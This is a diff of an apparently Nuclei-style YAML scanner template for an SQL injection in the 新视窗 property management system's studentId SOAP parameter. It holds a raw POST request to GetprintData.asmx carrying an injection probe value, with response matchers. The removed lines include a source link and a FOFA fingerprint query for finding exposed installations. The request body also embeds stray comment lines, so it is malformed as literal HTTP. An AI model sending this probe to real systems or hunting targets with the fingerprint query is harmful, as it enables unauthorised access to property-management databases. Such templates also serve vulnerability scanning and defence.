@@ -3,15 +3,11 @@ info:
   name: 新视窗-studentld-SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/te8xyt5elaai92bf'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: te8xyt5elaai92bf
-    fofa: body="localStorage.LoginInfo=null"||body="skins/v8_green/images/loginv8_New.png"||app="新视窗新一代物业管理系统"
 http:
 - raw:
-  - "POST /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1\n\nAccept-Encoding: gzip, deflate, br\n\nAccept: */*\n\nContent-Type: text/xml; charset=utf-8\n\nSOAPAction: \"http://tempuri.org/GetCertificateInfoByStudentId\"\n\n\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n\n  <soap:Body>\n\n    <GetCertificateInfoByStudentId xmlns=\"http://tempuri.org/\">\n\n      <studentId>1--+'</studentId>\n\n    </GetCertificateInfoByStudentId>\n\n  </soap:Body>\n\n</soap:Envelope>\n\n# 响应代码特征\n200\n\n# 响应内容特征\nGetCertificateInfoByStudentIdResponse\n\n# 上传文件定位\n暂无"
+  - "POST /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1\n\nAccept-Encoding: gzip, deflate, br\n\nAccept: */*\n\nContent-Type: text/xml; charset=utf-8\n\nSOAPAction: \"http://tempuri.org/GetCertificateInfoByStudentId\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n\n  <soap:Body>\n\n    <GetCertificateInfoByStudentId xmlns=\"http://tempuri.org/\">\n\n      <studentId>1--+'</studentId>\n\n    </GetCertificateInfoByStudentId>\n\n  </soap:Body>\n\n</soap:Envelope>\n\n# 响应代码特征\n200\n\n# 响应内容特征\nGetCertificateInfoByStudentIdResponse\n\n# 上传文件定位\n暂无"
   redirects: false
   matchers:
   - status:
